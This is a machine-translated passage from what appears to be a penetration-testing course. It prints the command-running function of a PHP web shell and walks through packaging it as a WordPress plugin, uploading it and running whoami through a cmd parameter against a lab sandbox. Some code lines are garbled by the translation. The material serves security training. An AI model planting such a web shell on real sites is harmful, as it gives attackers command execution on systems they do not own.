<div style="position:absolute;top:178504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果</font><font style="vertical-align: inherit;">在 HTTP 请求中设置</font><font style="vertical-align: inherit;">了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量，</font><font style="vertical-align: inherit;">第 20-24 行将尝试运行系统命令</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:178523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该插件将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">executeCommand</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数来识别和执行适当的</font></font></nobr></div>
<div style="position:absolute;top:178542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHP 内部 API，用于在目标系统上运行命令。</font><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">executeCommand</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能可以</font></font></nobr></div>
<div style="position:absolute;top:178562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在第 47-82 行找到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:178596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">47 函数执行命令（字符串 $command）{</font></font></nobr></div>
<div style="position:absolute;top:178614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">48</font></font></nobr></div>
<div style="position:absolute;top:178631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">49 # 尝试找到一种使用各种 PHP 内部机制来运行我们的命令的方法</font></font></nobr></div>
<div style="position:absolute;top:178648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">50 if (class_exists(' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ReflectionFunction</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ')) {</font></font></nobr></div>
<div style="position:absolute;top:178664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">51</font></font></nobr></div>
<div style="position:absolute;top:178681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">52    </font></font></nobr></div>
<div style="position:absolute;top:178681;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># http://php.net/manual/en/class.reflectionfunction.php</font></font></nobr></div>
<div style="position:absolute;top:178698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53    </font></font></nobr></div>
<div style="position:absolute;top:178698;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$function = new ReflectionFunction('system');</font></font></nobr></div>
<div style="position:absolute;top:178716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">54    </font></font></nobr></div>
<div style="position:absolute;top:178716;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$function-&gt;invoke($command);</font></font></nobr></div>
<div style="position:absolute;top:178732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">55</font></font></nobr></div>
<div style="position:absolute;top:178749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">56 } elseif (function_exists(' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">call_user_func_array</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ')) {</font></font></nobr></div>
<div style="position:absolute;top:178766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">57</font></font></nobr></div>
<div style="position:absolute;top:178783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">58    </font></font></nobr></div>
<div style="position:absolute;top:178783;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># http://php.net/manual/en/function.call-user-func-array.php</font></font></nobr></div>
<div style="position:absolute;top:178800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">59    </font></font></nobr></div>
<div style="position:absolute;top:178800;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">call_user_func_array('system', array($command));</font></font></nobr></div>
<div style="position:absolute;top:178817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">60</font></font></nobr></div>
<div style="position:absolute;top:178834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">61 } elseif (function_exists(' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">call_user_func</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ')) {</font></font></nobr></div>
<div style="position:absolute;top:178851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">62</font></font></nobr></div>
<div style="position:absolute;top:178868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">63    </font></font></nobr></div>
<div style="position:absolute;top:178868;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># http://php.net/manual/en/function.call-user-func.php</font></font></nobr></div>
<div style="position:absolute;top:178885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">64    </font></font></nobr></div>
<div style="position:absolute;top:178885;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">call_user_func('system', $command);</font></font></nobr></div>
<div style="position:absolute;top:178902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">65    </font></font></nobr></div>
<div style="position:absolute;top:178919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">66 } else if(function_exists(' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">passthru</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ')) {</font></font></nobr></div>
<div style="position:absolute;top:178936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">67    </font></font></nobr></div>
<div style="position:absolute;top:178953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">68    </font></font></nobr></div>
<div style="position:absolute;top:178953;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># https://www.php.net/manual/en/function.passthru.php</font></font></nobr></div>
<div style="position:absolute;top:178970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">69    </font></font></nobr></div>
<div style="position:absolute;top:178970;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ob_start();</font></font></nobr></div>
<div style="position:absolute;top:178987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">70    </font></font></nobr></div>
<div style="position:absolute;top:178987;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">passthru($command , $return_var);</font></font></nobr></div>
<div style="position:absolute;top:179004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">71    </font></font></nobr></div>
<div style="position:absolute;top:179004;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$output = ob_get_contents();</font></font></nobr></div>
<div style="position:absolute;top:179021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">72    </font></font></nobr></div>
<div style="position:absolute;top:179021;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ob_end_clean();</font></font></nobr></div>
<div style="position:absolute;top:179038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">73</font></font></nobr></div>
<div style="position:absolute;top:179055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">74}否则如果（function_exists（ '</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'））{</font></font></nobr></div>
<div style="position:absolute;top:179072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">75</font></font></nobr></div>
<div style="position:absolute;top:179089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">76    </font></font></nobr></div>
<div style="position:absolute;top:179089;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 这是最后的手段。</font><font style="vertical-align: inherit;">很有可能是 PHP Suhosin</font></font></nobr></div>
<div style="position:absolute;top:179106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">77    </font></font></nobr></div>
<div style="position:absolute;top:179106;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 无论如何在黑名单上有 system() :&gt;</font></font></nobr></div>
<div style="position:absolute;top:179123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">78</font></font></nobr></div>
<div style="position:absolute;top:179140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">79    </font></font></nobr></div>
<div style="position:absolute;top:179140;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># http://php.net/manual/en/function.system.php</font></font></nobr></div>
<div style="position:absolute;top:179157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80    </font></font></nobr></div>
<div style="position:absolute;top:179157;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统（$命令）；</font></font></nobr></div>
<div style="position:absolute;top:179173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">81 }</font></font></nobr></div>
<div style="position:absolute;top:179190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">82 }</font></font></nobr></div>
<div style="position:absolute;top:179210;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 878 - executeCommand 函数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:179239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">plugin-shell.php 插件是在系统上执行命令的催化剂。</font><font style="vertical-align: inherit;">一旦我们能够</font></font></nobr></div>
<div style="position:absolute;top:179259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在受感染主机上触发任意代码执行，我们可以使用多种方法</font></font></nobr></div>
<div style="position:absolute;top:179278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于获得适当的反向外壳。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:179312;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.5</font></font></i></nobr></div>
<div style="position:absolute;top:179312;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取外壳</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:179350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要获得 shell，我们首先必须以 WordPress 知道如何处理的方式打包插件。</font></font></nobr></div>
<div style="position:absolute;top:179370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WordPress 希望插件位于 zip 文件中。</font><font style="vertical-align: inherit;">当 WordPress 收到 zip 文件时，它会解压它</font></font></nobr></div>
<div style="position:absolute;top:179389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入服务器上的 wp-content/plugins 目录。</font><font style="vertical-align: inherit;">WordPress 放置 zip 文件的内容</font></font></nobr></div>
<div style="position:absolute;top:179408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到与 zip 文件本身的名称匹配的文件夹中。</font><font style="vertical-align: inherit;">因此，我们需要注意</font></font></nobr></div>
<div style="position:absolute;top:179428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件名，以便稍后能够访问我们的 PHP shell。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:179563;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="152"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 152 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:179596;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:180673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:180673;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:180673;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">769</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:179692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个 zip 文件的创建如清单 879 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:179726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /usr/share/seclists/Web-Shells/WordPress</font></font></font></b></nobr></div>
<div style="position:absolute;top:179761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/usr/share/seclists/Web-Shells/WordPress$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo zip plugin-shell.zip plugin-s</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:179778;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地狱.php</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:179794;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加：plugin-shell.php（缩小 58%）</font></font></nobr></div>
<div style="position:absolute;top:179814;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 879 - 为 web shell 创建 zip 包</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:179843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成的 zip 文件名为 plugin-shell.zip，将放置在 plugin-shell 文件夹中</font></font></nobr></div>
<div style="position:absolute;top:179863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器上的 wp-content/plugins。</font></font></nobr></div>
<div style="position:absolute;top:179896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在插件包已经生成，是时候上传shell了。</font><font style="vertical-align: inherit;">首先，我们需要访问</font></font></nobr></div>
<div style="position:absolute;top:179915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过单击</font><font style="vertical-align: inherit;">左侧边栏上的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插件</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链接，</font><font style="vertical-align: inherit;">插件页面</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:180443;left:365"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 334：访问插件页面 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:180751;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="153"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 153 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:180784;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:181861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:181861;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:181861;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">770</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:180874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.5.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:180895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们通过单击</font><font style="vertical-align: inherit;">左上角的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加新</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来安装插件</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这将带我们进入“添加插件”</font></font></nobr></div>
<div style="position:absolute;top:180914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">页。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:181442;left:375"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 335：添加插件页面 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:181939;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="154"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 154 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:181972;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:183049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:183049;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:183049;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">771</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:182062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.5.1.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:182083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们不是从 WordPress 插件目录下载插件，我们需要选择</font></font></nobr></div>
<div style="position:absolute;top:182102;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在页面左上角</font><i><font style="vertical-align: inherit;">上传插件</font></i><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:182630;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 336：上传插件对话框 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:183127;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="155"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 155 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:183160;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:184237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:184237;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:184237;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">772</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:183250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.5.1.3</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:183271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将打开一个部分，我们可以在其中选择我们的插件包。</font><font style="vertical-align: inherit;">我们需要选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Browse</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:183290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将打开一个文件对话框让我们找到创建的包。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:183771;left:369"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 337：选择插件 Zip</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:183802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开文件对话框后，我们导航到包含插件的目录，选择插件-</font></font></nobr></div>
<div style="position:absolute;top:183822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell.zip 文件，然后单击</font><font style="vertical-align: inherit;">文件对话框底部的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:184315;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="156"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 156 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:184348;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:185425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:185425;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:185425;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">773</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:184438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.5.1.4</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:184459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，要安装插件，我们单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Install Now</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:184986;left:369"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 338：安装插件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:185018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装插件将上传 zip 并提取内容。</font></font></nobr></div>
<div style="position:absolute;top:185050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在插件已安装，我们可以尝试使用它来运行系统命令</font></font></nobr></div>
<div style="position:absolute;top:185069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WordPress 目标。</font><font style="vertical-align: inherit;">为此，我们可以简单地使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cURL</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">如前所述，目录</font></font></nobr></div>
<div style="position:absolute;top:185089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插件是 wp-content/plugins/，zip 会被解压到一个名为 plugin-shell 的目录中，然后</font></font></nobr></div>
<div style="position:absolute;top:185108;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们定位的文件名为 plugin-shell.php。</font></font></nobr></div>
<div style="position:absolute;top:185141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，我们还必须设置一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数，其中包含我们尝试执行的命令</font></font></nobr></div>
<div style="position:absolute;top:185161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在目标系统上执行。</font><font style="vertical-align: inherit;">让我们尝试运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并查看 shell 是否有效。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:185195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.ph</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:185212;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">p </font></font><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">?cmd=whoami</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:185229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">万维网数据</font></font></nobr></div>
<div style="position:absolute;top:185249;left:374"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 880 - 运行 whoami</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:185278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效！</font><font style="vertical-align: inherit;">根据清单 880 的输出，我们以 www-data 用户身份运行命令。</font></font></nobr></div>
<div style="position:absolute;top:185297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在是时候上传一个 meterpreter 有效载荷并获得一个完整的反向 shell。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:185503;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="157"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 157 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:185536;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:186613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:186613;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:186613;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">774</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:185626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.5.1.5</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
